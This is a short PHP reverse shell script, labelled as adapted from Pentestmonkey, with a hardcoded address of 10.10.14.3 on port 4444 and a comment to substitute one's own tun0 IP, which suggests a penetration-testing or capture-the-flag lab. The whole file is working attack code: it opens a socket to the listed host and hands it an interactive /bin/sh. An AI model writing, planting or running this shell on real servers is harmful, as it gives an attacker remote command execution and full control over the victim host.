<?php
// Full-featured PHP reverse shell by Pentestmonkey (adapted)
$ip = '10.10.14.3'; // ← Replace with your tun0 IP
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>

